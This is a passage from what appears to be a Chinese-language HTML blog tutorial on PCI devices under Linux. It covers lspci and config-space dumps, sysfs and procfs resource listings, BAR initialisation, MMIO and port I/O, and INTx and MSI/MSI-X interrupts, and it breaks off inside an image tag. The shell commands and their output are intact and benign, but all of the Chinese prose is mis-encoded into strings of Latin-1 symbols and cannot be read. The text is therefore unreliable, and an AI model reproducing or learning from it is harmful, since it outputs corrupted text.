GD 5446 [1013:00b8] (prog-if 00 [VGA controller])<br>        Subsystem: Red Hat, Inc. QEMU Virtual Machine [1af4:1100]<br>        Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx-<br>        Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-<br>        Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M]<br>        Region 1: Memory at febd0000 (32-bit, non-prefetchable) [size=4K]<br>        Expansion ROM at 000c0000 [disabled] [size=128K]<br>        Kernel driver in use: cirrus<br>        Kernel modules: cirrusfb, cirrus<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ç›´æ¥ä½¿ç”¨ <code>-x</code> å‚æ•°æ¥æŸ¥çœ‹ PCI è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -s 00:02.0 -x</span><br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00<br>10: 08 00 00 fc 00 00 bd fe 00 00 00 00 00 00 00 00<br>20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11<br>30: 00 00 bc fe 00 00 00 00 00 00 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>åœ¨ Linux å½“ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ procfs æˆ– sysfs è¿™æ ·çš„æ–‡ä»¶ç³»ç»Ÿæ¥æŸ¥çœ‹è®¾å¤‡çš„ç›¸å…³é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡ <code>/proc/bus/pci/00/00.0</code> æ–‡ä»¶æˆ‘ä»¬åŒæ ·å¯ä»¥æŸ¥çœ‹ PCI è®¾å¤‡ <code>00:02.0</code> çš„é…ç½®ç©ºé—´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/bus/pci/00/02.0 | xxd</span><br>00000000: 1310 b800 0301 0000 0000 0003 0000 0000  ................<br>00000010: 0800 00fc 0000 bdfe 0000 0000 0000 0000  ................<br>00000020: 0000 0000 0000 0000 0000 0000 f41a 0011  ................<br>00000030: 0000 bcfe 0000 0000 0000 0000 0000 0000  ................<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>/sys/devices/pci0000:00/0000:00:02.0/resource</code> è·å–åˆ°çš„ä¿¡æ¯ä¸­æ¯è¡Œè¡¨ç¤ºä¸€ä¸ªåœ°å€ç©ºé—´ï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œä¸º MMIOï¼Œç¬¬äºŒè¡Œä¸º PMIOï¼Œä¸‰åˆ—ä¿¡æ¯åˆ†åˆ«ä¸ºèµ·å§‹åœ°å€ã€ç»ˆæ­¢åœ°å€ã€æ ‡å¿—ä½ ï¼Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:02.0/resource</span><br>0x00000000fc000000 0x00000000fdffffff 0x0000000000042208<br>0x00000000febd0000 0x00000000febd0fff 0x0000000000040200<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x00000000000c0000 0x00000000000dffff 0x0000000000000212<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>/sys/devices/pci0000:00/0000:00:02.0</code> ä¸‹çš„å…¶ä»–æ–‡ä»¶ä¹Ÿå¯ä»¥è®¿é—®è¯¥è®¾å¤‡çš„ä¸€äº›å…¶ä»–èµ„æºä¿¡æ¯ï¼ˆä¾‹å¦‚é€šè¿‡ <code>resource0</code> å¯ä»¥ç›´æ¥è®¿é—® MMIO ç©ºé—´ï¼Œ<code>resource1</code> åˆ™ä¸ºå…¶ PMIO ç©ºé—´ï¼‰</p><h2 id="äº”ã€PCI-Base-Address-register"><a href="#äº”ã€PCI-Base-Address-register" class="headerlink" title="äº”ã€PCI Base Address register"></a>äº”ã€PCI Base Address register</h2><h3 id="I-åŸºæœ¬æ¦‚å¿µ"><a href="#I-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="I.åŸºæœ¬æ¦‚å¿µ"></a>I.åŸºæœ¬æ¦‚å¿µ</h3><p><strong>Base Address register</strong>ï¼ˆBARï¼‰æ˜¯ PCI è®¾å¤‡é…ç½®ç©ºé—´ä¸­éå¸¸é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œè¯¥ç»„å¯„å­˜å™¨ï¼ˆä¹Ÿç§°ä¹‹ä¸º BARç©ºé—´ï¼‰ç”¨ä»¥å®šä¹‰ PCI <strong>éœ€è¦çš„é…ç½®ç©ºé—´å¤§å°</strong>ä»¥åŠé…ç½® PCI è®¾å¤‡<strong>å ç”¨çš„åœ°å€ç©ºé—´</strong></p><p>æˆ‘ä»¬éƒ½çŸ¥é“ä¸è®¾å¤‡é€šä¿¡æœ‰ä¸¤ç§æ–¹å¼ï¼šMMIO ä¸ Port IOï¼Œç›¸åº”åœ° BAR çš„æ ¼å¼ä¹Ÿæœ‰å¦‚ä¸‹ä¸¤ç§ï¼š</p><ul><li><p><strong>MMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/CzV32oBP71at9Fg.png" alt="image.png"></p></li><li><p><strong>PMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/w4ind36EF9pPLcy.png" alt="image.png"></p></li></ul><h3 id="II-BAR-çš„åˆå§‹åŒ–"><a href="#II-BAR-çš„åˆå§‹åŒ–" class="headerlink" title="II. BAR çš„åˆå§‹åŒ–"></a>II. BAR çš„åˆå§‹åŒ–</h3><p>å½“ PCI è®¾å¤‡å¤ä½åï¼Œå…¶ä¼šåœ¨ BAR ä¸­å­˜æ”¾è¯¥è®¾å¤‡æ‰€éœ€ä½¿ç”¨çš„èµ„æºç±»å‹ä¸å¤§å°ï¼Œå½“æ“ä½œç³»ç»Ÿå¯¹ PCI æ€»çº¿è¿›è¡Œé…ç½®æ—¶ï¼Œé¦–å…ˆä¼šè·å–åˆ° PCI è®¾å¤‡çš„ BAR ä¸­çš„åˆå§‹ä¿¡æ¯ï¼Œä¹‹åæ ¹æ®è¯¥åˆå§‹ä¿¡æ¯åˆ†é…åˆç†çš„ <strong>PCI æ€»çº¿åŸŸåœ°å€</strong>ï¼Œå°†å…¶<strong>å†™å›åˆ° BAR å½“ä¸­</strong></p><p>é€šè¿‡ BAR è¿›è¡Œèµ„æºåˆ†é…çš„å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å½“ PCI å¤ä½æ—¶ï¼Œå…¶ä¼šå‘ BAR ä¸­å†™å…¥èµ„æºä¿¡æ¯ï¼Œ<strong>é€šè¿‡å°†ä½ä½çš„ bit è®¾ç½®ä¸º read only çš„ 0 æ¥æ ‡è¯†æœ€å°åœ°å€ç©ºé—´å¤§å°</strong></li><li>ç³»ç»Ÿè½¯ä»¶ï¼ˆä¾‹å¦‚ BIOSï¼‰é€šè¿‡å‘ BAR å†™ä¸€ä¸ª<strong>æ‰€æœ‰ bit éƒ½ä¸º 1 çš„å€¼</strong>æ¥ç¡®å®šä»å“ªä¸ª bit å¼€å§‹æ˜¯å¯å†™çš„ï¼Œä»è€Œè·å–åˆ°è¯¥ BAR å¯¹åº”æ‰€éœ€çš„<strong>æœ€å°åœ°å€ç©ºé—´</strong>ï¼ŒåŒæ—¶é€šè¿‡æœ€ä½ä½æ¥è·å–åˆ° BAR çš„ç±»å‹ï¼Œå¹¶å¯¹åº”ä¸ºè¿™äº› BAR ç©ºé—´åˆ†é…åœ°å€ï¼Œ<strong>å¹¶å°†åˆ†é…çš„åœ°å€å†™å› BAR ç©ºé—´ä¸­</strong></li></ul><blockquote><p> æ¯”å¦‚è¯´ä½ 20 bit éƒ½ä¸å¯å†™ï¼Œé‚£å°±æ˜¯è¯´è¿™ä¸ª bar æ‰€éœ€è¦çš„åœ°å€ç©ºé—´æœ€å°ä¸º 1MBï¼Œæœ€åä»åœ°å€æ€»çº¿ä¸Šåˆ†é…ä¸€ä¸ª1MB å¯¹é½çš„åœ°å€å†™å› bar é‡Œ</p></blockquote><h3 id="III-å¤„ç†å™¨åŸŸä¸-PCI-åŸŸé—´è®¿é—®"><a href="#III-å¤„ç†å™¨åŸŸä¸-PCI-åŸŸé—´è®¿é—®" class="headerlink" title="III. å¤„ç†å™¨åŸŸä¸ PCI åŸŸé—´è®¿é—®"></a>III. å¤„ç†å™¨åŸŸä¸ PCI åŸŸé—´è®¿é—®</h3><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œ<strong>å¤„ç†å™¨ä½¿ç”¨å­˜å‚¨å™¨åŸŸçš„åœ°å€ï¼Œè€Œ BAR å¯„å­˜å™¨å­˜æ”¾ PCI æ€»çº¿åŸŸçš„åœ°å€</strong>ï¼Œå› æ­¤å¤„ç†å™¨ä¸èƒ½ç›´æ¥é€šè¿‡ <code>BAR + offset</code> çš„æ–¹å¼è®¿é—® PCI è®¾å¤‡çš„ BAR ç©ºé—´ï¼Œè€Œåº”å½“è¦<strong>å°† PCI æ€»çº¿åŸŸçš„åœ°å€è½¬æ¢ä¸ºå­˜å‚¨å™¨åŸŸçš„åœ°å€</strong></p><p>ç”±æ­¤ï¼ŒPCI BAR ä¸­åœ°å€åœ¨å­˜å‚¨å™¨åŸŸä¸­çš†æœ‰ç€ç›¸åº”çš„æ˜ åƒï¼Œå½“å¤„ç†å™¨è®¿é—® PCI è®¾å¤‡çš„åœ°å€ç©ºé—´æ—¶ï¼Œé¦–å…ˆè®¿é—®è¯¥è®¾å¤‡åœ¨å­˜å‚¨å™¨åŸŸä¸­çš„åœ°å€ç©ºé—´ï¼Œä¹‹åé€šè¿‡ HOST ä¸»æ¡¥å°†å­˜å‚¨å™¨åŸŸä¸Šåœ°å€ç©ºé—´è½¬æ¢ä¸º PCI æ€»çº¿åŸŸçš„åœ°å€ç©ºé—´ï¼Œæœ€åé€šè¿‡ PCI æ€»çº¿å°†æ•°æ®å‘é€åˆ°æŒ‡å®šçš„è®¾å¤‡ä¸­</p><p>åä¹‹äº¦ç„¶ï¼Œå½“ PCI è®¾å¤‡éœ€è¦è®¿é—®å­˜å‚¨å™¨åŸŸçš„åœ°å€ç©ºé—´æ—¶ï¼ˆDMA æ“ä½œï¼‰ï¼Œé¦–å…ˆéœ€è¦è®¿é—®è¯¥å­˜å‚¨å™¨åœ°å€ç©ºé—´æ‰€å¯¹åº”çš„ PCI æ€»çº¿ç©ºé—´ï¼Œä¹‹åé€šè¿‡ HOST ä¸»æ¡¥å°†å…¶è½¬æ¢ä¸ºå­˜å‚¨å™¨åœ°å€ç©ºé—´ï¼Œå†ç”± DDR æ§åˆ¶å™¨å®Œæˆå¯¹å­˜å‚¨å™¨çš„è¯»å†™</p><h2 id="å…­ã€PCI-è®¾å¤‡å†…å­˜-amp-ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼"><a href="#å…­ã€PCI-è®¾å¤‡å†…å­˜-amp-ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼" class="headerlink" title="å…­ã€PCI è®¾å¤‡å†…å­˜ &amp; ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼"></a>å…­ã€PCI è®¾å¤‡å†…å­˜ &amp; ç«¯å£ç©ºé—´ä¸è®¿é—®æ–¹å¼</h2><p>å‰é¢æˆ‘ä»¬è®²äº† PCI è®¾å¤‡ä¸ç‰¹æ€§å’Œé…ç½®ç›¸å…³çš„é…ç½®ç©ºé—´ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸ PCI è®¾å¤‡ä¸å®é™…æ“ä½œç›¸å…³çš„å†…å­˜æ˜ å°„ç©ºé—´ä¸ç«¯å£æ˜ å°„ç©ºé—´</p><p>æ‰€æœ‰ IO è®¾å¤‡çš„å†…å­˜ä¸ç«¯å£ç©ºé—´éœ€è¦è¢«æ˜ å°„åˆ°å¯¹åº”çš„åœ°å€ç©ºé—´&#x2F;ç«¯å£ç©ºé—´ä¸­æ‰èƒ½è®¿é—®ï¼Œè¿™éœ€è¦å ç”¨éƒ¨åˆ†çš„å†…å­˜åœ°å€ç©ºé—´ä¸ç«¯å£åœ°å€ç©ºé—´ï¼Œå³æˆ‘ä»¬æœ‰ä¸¤ç§æ˜ å°„å¤–è®¾èµ„æºçš„æ–¹å¼ï¼š</p><ul><li><strong>MMIO</strong>ï¼ˆMemory-mapped I&#x2F;Oï¼‰ï¼šå³å†…å­˜æ˜ å°„ IOã€‚è¿™ç§æ–¹å¼å°† IO è®¾å¤‡çš„å†…å­˜ä¸å¯„å­˜å™¨æ˜ å°„åˆ°æŒ‡å®šçš„å†…å­˜åœ°å€ç©ºé—´ä¸Šï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡å¸¸è§„çš„è®¿é—®å†…å­˜çš„æ–¹å¼æ¥ç›´æ¥è®¿é—®åˆ°è®¾å¤‡çš„å¯„å­˜å™¨ä¸å†…å­˜</li><li><strong>PMIO</strong>ï¼ˆPort-mapped I&#x2F;Oï¼‰ï¼šå³ç«¯å£æ˜ å°„ IOã€‚è¿™ç§æ–¹å¼å°† IO è®¾å¤‡çš„å¯„å­˜å™¨ç¼–ç åˆ°æŒ‡å®šçš„ç«¯å£ä¸Šï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è®¿é—®ç«¯å£çš„æ–¹å¼æ¥è®¿é—®è®¾å¤‡çš„å¯„å­˜å™¨ä¸å†…å­˜ï¼ˆä¾‹å¦‚åœ¨ x86 ä¸‹é€šè¿‡ <code>in</code> ä¸ <code>out</code> è¿™ä¸€ç±»çš„æŒ‡ä»¤å¯ä»¥è¯»å†™ç«¯å£ï¼‰ã€‚IO è®¾å¤‡é€šè¿‡ä¸“ç”¨çš„é’ˆè„šæˆ–è€…ä¸“ç”¨çš„æ€»çº¿ä¸ CPU è¿æ¥ï¼Œè¿™ä¸å†…å­˜åœ°å€ç©ºé—´ç›¸ç‹¬ç«‹ï¼Œå› æ­¤åˆç§°ä½œ isolated I&#x2F;O</li></ul><p>å®Œæˆæ˜ å°„ä¹‹åé€šè¿‡ç›¸åº”çš„å†…å­˜&#x2F;ç«¯å£è®¿é—®åˆ°çš„ä¾¿æ˜¯ PCI è®¾å¤‡çš„å†…å­˜&#x2F;ç«¯å£åœ°å€ç©ºé—´</p><blockquote><p>ä¾‹å¦‚å®æ¨¡å¼ä¸‹çš„ <code>0xA0000 ~ 0xBFFFF</code> è¿™ 128KB åœ°å€ç©ºé—´é€šå¸¸è¢«ç”¨ä½œæ˜¾å­˜çš„æ˜ å°„ï¼Œå½“æˆ‘ä»¬åœ¨å®æ¨¡å¼ä¸‹è¯»å†™è¿™å—åŒºåŸŸæ—¶é€šå¸¸ä¾¿æ˜¯ç›´æ¥è¯»å†™æ˜¾å¡ä¸Šçš„æ˜¾å­˜ï¼Œè€Œå¹¶éæ™®é€šçš„å†…å­˜</p></blockquote><p>é€šè¿‡ procfs çš„ <code>/proc/iomem</code> æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç‰©ç†åœ°å€ç©ºé—´çš„æƒ…å†µï¼Œå…¶ä¸­æˆ‘ä»¬ä¾¿èƒ½çœ‹åˆ°å„ç§è®¾å¤‡æ‰€å ç”¨çš„åœ°å€ç©ºé—´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/iomem</span><br>00000000-00000fff : Reserved<br>00001000-0009fbff : System RAM<br>0009fc00-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000c91ff : Video ROM<br>000c9800-000ca1ff : Adapter ROM<br>000ca800-000ccbff : Adapter ROM<br>000f0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7ffdffff : System RAM<br>  1f400000-20200e70 : Kernel code<br>  20200e71-2105843f : Kernel data<br>  2132b000-217fffff : Kernel bss<br>7ffe0000-7fffffff : Reserved<br>80000000-febfffff : PCI Bus 0000:00<br>  fc000000-fdffffff : 0000:00:02.0<br>    fc000000-fdffffff : cirrus<br>  feb80000-febbffff : 0000:00:03.0<br>  febd0000-febd0fff : 0000:00:02.0<br>    febd0000-febd0fff : cirrus<br>  febd1000-febd1fff : 0000:00:03.0<br>  febd2000-febd2fff : 0000:00:04.0<br>  febd3000-febd3fff : 0000:00:05.0<br>fec00000-fec003ff : IOAPIC 0<br>fee00000-fee00fff : Local APIC<br>feffc000-feffffff : Reserved<br>fffc0000-ffffffff : Reserved<br></code></pre></td></tr></table></figure><p>é€šè¿‡ procfs çš„ <code>/proc/ioports</code> æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ IO ç«¯å£æƒ…å†µï¼Œå…¶ä¸­ä¾¿åŒ…æ‹¬å„ç§è®¾å¤‡å¯¹åº”çš„ PMIO ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/ioports</span><br>0000-0cf7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>  0170-0177 : 0000:00:01.1<br>    0170-0177 : ata_piix<br>  01f0-01f7 : 0000:00:01.1<br>    01f0-01f7 : ata_piix<br>  0376-0376 : 0000:00:01.1<br>    0376-0376 : ata_piix<br>  03f2-03f2 : floppy<br>  03f4-03f5 : floppy<br>  03f6-03f6 : 0000:00:01.1<br>    03f6-03f6 : ata_piix<br>  03f7-03f7 : floppy<br>  03f8-03ff : serial<br>  0505-0505 : QEMU0001:00<br>  0510-051b : QEMU0002:00<br>    0510-051b : fw_cfg_io<br>  0600-063f : 0000:00:01.3<br>    0600-0603 : ACPI PM1a_EVT_BLK<br>    0604-0605 : ACPI PM1a_CNT_BLK<br>    0608-060b : ACPI PM_TMR<br>  0700-070f : 0000:00:01.3<br>    0700-0708 : piix4_smbus<br>0cf8-0cff : PCI conf1<br>0d00-adff : PCI Bus 0000:00<br>ae0f-aeff : PCI Bus 0000:00<br>af20-afdf : PCI Bus 0000:00<br>afe0-afe3 : ACPI GPE0_BLK<br>afe4-ffff : PCI Bus 0000:00<br>  c000-c03f : 0000:00:05.0<br>    c000-c03f : virtio-pci-legacy<br>  c040-c05f : 0000:00:01.2<br>    c040-c05f : uhci_hcd<br>  c060-c07f : 0000:00:03.0<br>    c060-c07f : virtio-pci-legacy<br>  c080-c09f : 0000:00:04.0<br>    c080-c09f : virtio-pci-legacy<br>  c0a0-c0bf : 0000:00:06.0<br>    c0a0-c0bf : virtio-pci-legacy<br>  c0c0-c0cf : 0000:00:01.1<br>    c0c0-c0cf : ata_piix<br></code></pre></td></tr></table></figure><h2 id="ä¸ƒã€PCI-ä¸­æ–­æœºåˆ¶"><a href="#ä¸ƒã€PCI-ä¸­æ–­æœºåˆ¶" class="headerlink" title="ä¸ƒã€PCI ä¸­æ–­æœºåˆ¶"></a>ä¸ƒã€PCI ä¸­æ–­æœºåˆ¶</h2><p>PCI è®¾å¤‡æœ‰ä¸¤ç§æ‰“ä¸­æ–­çš„æ–¹æ³•ï¼šä¼ ç»Ÿçš„ INTx ä¸­æ–­ä¸ MSI ä¸­æ–­ï¼Œå‡ºäºå…¼å®¹çš„éœ€è¦ PCIe å®Œå…¨ç»§æ‰¿äº†è¿™ä¸ªç‰¹æ€§</p><h3 id="I-INTx-ä¸­æ–­"><a href="#I-INTx-ä¸­æ–­" class="headerlink" title="I. INTx ä¸­æ–­"></a>I. INTx ä¸­æ–­</h3><p>INTx ç±»å‹çš„ä¸­æ–­å³ä¼ ç»Ÿçš„<strong>é€šè¿‡ä¸­æ–­å¼•è„šæ¥äº§ç”Ÿçš„ä¸­æ–­</strong>ï¼ŒPCI æ€»çº¿ä½¿ç”¨ <code>INTA#</code> ã€<code>INTB#</code> ã€<code>INTC#</code> ã€<code>INTD#</code>  ä¿¡å·ï¼ˆä½ç”µå¹³æœ‰æ•ˆï¼‰å‘å¤„ç†å™¨å‘å‡ºä¸­æ–­è¯·æ±‚ï¼Œä¸è¿‡å¤šæ•°è®¾å¤‡ä»…ä½¿ç”¨ <code>INTA#</code> ä¿¡å·</p><p>ä¸‹å›¾ä¸ºä¸€ä¸ªäº§ç”Ÿ  <code>INTA#</code> ä¸­æ–­ä¿¡å·çš„æµç¨‹ï¼š</p><ul><li>è®¾å¤‡å‘å—æ¡¥ä¸Šçš„ä¸­æ–­æ§åˆ¶å™¨æ‰“ä¸€ä¸ª  <code>INTA#</code> ï¼Œä¸­æ–­æ§åˆ¶å™¨è½¬ä¸º <code>INTR</code> ä¿¡å·åé€šè¿‡ APIC bus æ‰“å‘å¤„ç†å™¨</li><li>æ¥å—ä¸­æ–­ä¿¡å·çš„å¤„ç†å™¨ï¼ˆæœªè®¾ç½®åˆ™é»˜è®¤éƒ½æ‰“åˆ° CPU0ï¼‰é€šè¿‡ä¸­æ–­å‘é‡è¡¨æ‰§è¡Œå¯¹åº”çš„å¤„ç†ç¨‹åº</li></ul><p><img src="https://s2.loli.net/2022/08/31/32jbJDlOpRKSIqy.png" alt="image.png"></p><p>åœ¨ PCI æ€»çº¿ä¸­ï¼Œè®¾å¤‡çš„ <code>INTx å¼•è„š</code>æœ€ç»ˆè¦è¿æ¥åˆ°ä¸­æ–­æ§åˆ¶å™¨çš„ <code>IRQ å¼•è„š</code> ï¼Œä¸‹å›¾æ˜¯ä¸€ä¸ªä¸‰ PCI æ’æ§½ä¸ä¸­æ–­æ§åˆ¶å™¨å¼•è„šè¿›è¡Œè¿æ¥çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/08/31/ZyIur4L7U5oCjJO.png" alt="çŸ¥ä¹å·çš„å›¾"></p><p>è¿˜è®°å¾—æˆ‘ä»¬å‰æ–‡æ‰€è®²çš„ PCI é…ç½®ç©ºé—´ä¸­çš„ <code>Interrupt Pin</code> ä¸ <code>Interrupt Line</code> åŸŸå—ï¼Ÿç°åœ¨æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æ˜ç¡®å…¶å…·ä½“ç”¨é€”äº†ï¼š</p><ul><li><code>Interrupt Pin</code>ï¼šè®°å½•è®¾å¤‡åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ª INTx ä¸­æ–­ä¿¡å·</li><li><code>Interrupt Line</code>ï¼šè®°å½•è®¾å¤‡è¿æ¥çš„å¼•è„š</li></ul><p><img src="https://s2.loli.net/2022/08/31/jbtsuypMvza9Nex.png" alt="image.png"></p><h3 id="II-MSI-x2F-MSI-X-ä¸­æ–­"><a href="#II-MSI-x2F-MSI-X-ä¸­æ–­" class="headerlink" title="II. MSI&#x2F;MSI-X ä¸­æ–­"></a>II. MSI&#x2F;MSI-X ä¸­æ–­</h3><p><strong>Message Signaled Interrupt</strong> æ˜¯ä¸€ç§æ›´ä¸ºç°ä»£åŒ–ä¸æ™®éçš„ PCI ä¸­æ–­æœºåˆ¶ï¼Œ<strong>MSI-eXtend</strong> åˆ™ä¸ºå…¶å‡çº§ç‰ˆï¼Œè¯¥æœºåˆ¶çš„å¼•å…¥æ˜¯ä¸ºäº†æ¶ˆé™¤ INTx çš„è¾¹å¸¦ä¿¡å·ï¼Œç›®å‰ç»å¤§å¤šæ•° PCIe è®¾å¤‡å·²ä¸å†ä½¿ç”¨ä¼ ç»Ÿçš„ INTx ä¸­æ–­ï¼Œè€Œæ˜¯ä½¿ç”¨ MSI&#x2F;MSI-X æäº¤ä¸­æ–­è¯·æ±‚</p><p>åœ¨ PCIe è®¾å¤‡ä¸­æœ‰ç€ä¸¤ä¸ª Capability ç»“æ„ï¼Œåˆ†åˆ«å¯¹åº” MSI ä¸ MSI-Xï¼Œé€šå¸¸ä¸€ä¸ª PCIe è®¾å¤‡ä»…ä¼šåŒ…å«å…¶ä¸­ä¸€ä¸ªã€‚å¯¹äº MSI è€Œè¨€å…¶ Capability ID ä¸º 5ï¼Œä¸€å…±æœ‰å››ç§ç»“æ„ï¼Œåˆ†åˆ«å¯¹åº” 32 ä½ä¸ 64 ä½çš„ Message ç»“æ„ï¼Œä»¥åŠå¯¹åº”çš„å¸¦ä¸Šä¸­æ–­ Masking çš„ç»“æ„</p><p><img src="https://s2.loli.net/2022/08/31/v657FsLHc9Kx2Aq.png" alt="çŸ¥ä¹å·çš„å›¾"></p><p>MSI&#x2F;MSI-X æœ¬è´¨ä¸Šæ˜¯é€šè¿‡<strong>å‘ç‰¹å®šçš„å†…å­˜åŒºåŸŸè¿›è¡Œå†™å…¥</strong>æ¥è¾¾åˆ°ä¸­æ–­è§¦å‘çš„æ•ˆæœï¼Œå½“ PCI è®¾å¤‡æäº¤è¯·æ±‚æ—¶ï¼Œå…¶å‘ <code>MSI/MSI-x Capability</code> ç»“æ„ä¸­çš„ <code>Message Address</code> åœ°å€ï¼ˆPCIæ€»çº¿åŸŸï¼‰å†™å…¥ <code>Message Data</code> æ•°æ®ï¼Œä»è€Œäº§ç”Ÿä¸€ä¸ªå­˜å‚¨å™¨å†™ TLPï¼Œç”±æ­¤å‘å¤„ç†å™¨æäº¤å­˜å‚¨å™¨å†™è¯·æ±‚</p><p>MSI ä»…æ”¯æŒ 32 ä¸ªè¿ç»­çš„ä¸­æ–­å‘é‡ï¼Œè€Œ MSI-X æ”¯æŒ 2048 ä¸ªéè¿ç»­çš„ä¸­æ–­å‘é‡ï¼Œä½† MSI-X çš„ä¸­æ–­å‘é‡ä¿¡æ¯å¹¶ä¸åƒ MSI é‚£æ ·ç›´æ¥å­˜æ”¾åœ¨é…ç½®ç©ºé—´ï¼Œè€Œæ˜¯å­˜æ”¾åœ¨ MMIO ç©ºé—´ä¸­ï¼Œé€šè¿‡BIRï¼ˆBase address Indicator Registerï¼‰ä¸ BAR æ¥ç¡®å®šå…¶åœ¨ MMIO ä¸­çš„å…·ä½“ä½ç½®</p><p><img src="https://s2.loli.net/2022/08/31/QpYXgx5eKczydkE.png" 